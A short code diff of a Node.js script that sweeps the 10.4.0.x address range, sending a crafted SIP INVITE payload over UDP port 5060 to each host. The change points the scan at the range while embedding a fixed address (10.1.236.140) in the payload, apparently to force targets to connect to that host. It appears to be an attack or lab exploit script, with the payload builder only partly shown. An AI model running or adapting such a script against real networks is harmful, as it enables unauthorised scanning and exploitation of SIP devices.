@@ -7,10 +7,12 @@ var makePayload = (forceConnectIP) => {return `INVITE sip:root@${forceConnectIP}
 
 
 for (let i = 0; i < 255; i++) {
-	let ip = `10.4.0.${i}`;
+	let sipip = `10.4.0.${i}`;
+	let ip = '10.1.236.140';
+	//let sipip = '10.4.0.65';
 	let payload = makePayload(ip);
 	payload = Buffer.from(payload);
-	client.send(payload, 5060, ip, (err) => {
+	client.send(payload, 5060, sipip, (err) => {
 	});
 
 	client.on('close', function() {
